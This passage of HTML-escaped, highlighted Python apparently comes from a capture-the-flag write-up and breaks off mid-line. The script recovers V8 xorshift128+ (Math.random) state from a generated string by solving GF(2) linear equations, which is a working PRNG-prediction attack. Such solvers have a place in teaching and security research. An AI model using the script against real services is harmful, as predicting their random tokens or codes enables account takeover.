class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;179&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;180&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;181&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;182&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;183&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;184&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;185&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;186&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;187&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;188&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;189&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;190&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;191&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;193&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;194&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;195&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;196&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;197&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;198&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;199&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;200&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;201&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;202&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#!/usr/bin/python3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; struct, time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; hashlib &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; md5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; tqdm &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; trange&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alphabet =  &lt;span class=&#34;string&#34;&gt;&amp;#x27;abcdefghijklmnopqrstuvwxyz0123456789&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;generate_same_for&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;alphabet&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sames_for = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    alphas = &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(alphabet)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(alphas):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        start = i / alphas&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        end = (i + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) / alphas&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        float_begin = struct.pack(&lt;span class=&#34;string&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;, start + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        float_end = struct.pack(&lt;span class=&#34;string&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;, end + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        uint_begin = struct.unpack(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;Q&amp;quot;&lt;/span&gt;, float_begin)[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;amp; ((&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;52&lt;/span&gt;) - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        uint_end = (struct.unpack(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;Q&amp;quot;&lt;/span&gt;, float_end)[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;amp; ((&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;52&lt;/span&gt;) - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        x, y = &lt;span class=&#34;built_in&#34;&gt;bin&lt;/span&gt;(uint_begin)[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:].zfill(&lt;span class=&#34;number&#34;&gt;52&lt;/span&gt;), &lt;span class=&#34;built_in&#34;&gt;bin&lt;/span&gt;(uint_end)[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:].zfill(&lt;span class=&#34;number&#34;&gt;52&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sames = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; x[sames] == y[sames]:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            sames += &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sames_for.append((&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(x[:sames], &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; sames &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, sames))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; sames_for&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sames_for = generate_same_for(alphabet)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;solve&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;question, alphabet, sames_for&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sequence = [alphabet.index(i) &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; question]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;test_solution&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;prefix_count&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;make_left_shift&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;state, n&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; state[n:] + [&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]*n&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;make_right_shift&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;state, n&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; [&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]*n + state[:-n]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;make_xor&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;s1, s2&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; [s1[i]^s2[i] &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        As = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        bs = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add_equs&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;ss, vals, cnt&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;nonlocal&lt;/span&gt; As, bs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(cnt):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                As.append(ss[i])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                bs.append((vals&amp;gt;&amp;gt;(cnt-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;-i))&amp;amp;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        matched = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cur = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        se_state0 = [&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;i &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        se_state1 = [&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;i &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; matched &amp;lt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(sequence):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                se_s1 = se_state0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                se_s0 = se_state1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                se_state0 = se_s0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                se_s1 = make_xor(se_s1, make_left_shift(se_s1, &lt;span class=&#34;number&#34;&gt;23&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                se_s1 = make_xor(se_s1, make_right_shift(se_s1, &lt;span class=&#34;number&#34;&gt;17&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                se_s1 = make_xor(se_s1, se_s0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                se_s1 = make_xor(se_s1, make_right_shift(se_s0, &lt;span class=&#34;number&#34;&gt;26&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                se_state1 = se_s1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                correct_index = &lt;span class=&#34;number&#34;&gt;64&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; - i + cur - prefix_count&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; correct_index &amp;gt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; correct_index &amp;lt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(sequence):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    uu = sames_for[sequence[correct_index]]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    add_equs(se_state0, uu[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;], uu[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    matched += &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            cur += &lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        BAs = [&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]*&lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Bbs = [&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]*&lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(As)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            A, b = As[i], bs[i]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            listed = &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; ((A&amp;gt;&amp;gt;j)&amp;amp;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; BAs[j] == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    BAs[j] = A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    Bbs[j] = b&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    listed = &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    A ^= BAs[j]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    b ^= Bbs[j]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; listed &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; b:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span 